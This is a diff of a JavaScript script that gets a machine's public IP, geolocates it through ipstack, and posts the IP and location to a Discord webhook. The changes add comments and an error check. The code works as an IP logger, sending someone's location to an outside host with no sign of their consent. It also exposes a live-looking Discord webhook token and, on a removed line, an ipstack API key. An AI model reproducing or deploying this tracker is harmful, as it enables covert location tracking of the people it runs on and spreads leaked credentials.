@@ -1,6 +1,6 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 const ipstackAPI = "http://api.ipstack.com/";
-const apiKey = "474d0f3cee0cdd0caf72f48191d95c17"; // Replace with your ipstack API key
+const apiKey = "YOUR_API_KEY"; // Replace with your ipstack API key
 const webhookURL =
   "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";
 
@@ -35,13 +35,15 @@ async function getGeolocation(ip) {
   try {
     const response = await fetch(`${ipstackAPI}${ip}?access_key=${apiKey}`);
     const data = await response.json();
-    console.log("Geolocation Data:", data); // Log full geolocation data for debugging
+    console.log("Full Geolocation Data:", data); // Log full geolocation data for debugging
 
+    // Check if the response contains a valid status
     if (data.error) {
       console.error("Error fetching geolocation:", data.error.info);
       return null;
     }
 
+    // Return the location data only if available
     return {
       city: data.city,
       region: data.region_name,
@@ -97,7 +99,11 @@ async function main() {
   const ip = await getIP();
   if (ip) {
     const location = await getGeolocation(ip);
-    await sendToDiscord(ip, location);
+    if (location) {
+      await sendToDiscord(ip, location);
+    } else {
+      console.error("Could not fetch location.");
+    }
   } else {
     console.error("Could not retrieve IP address.");
   }
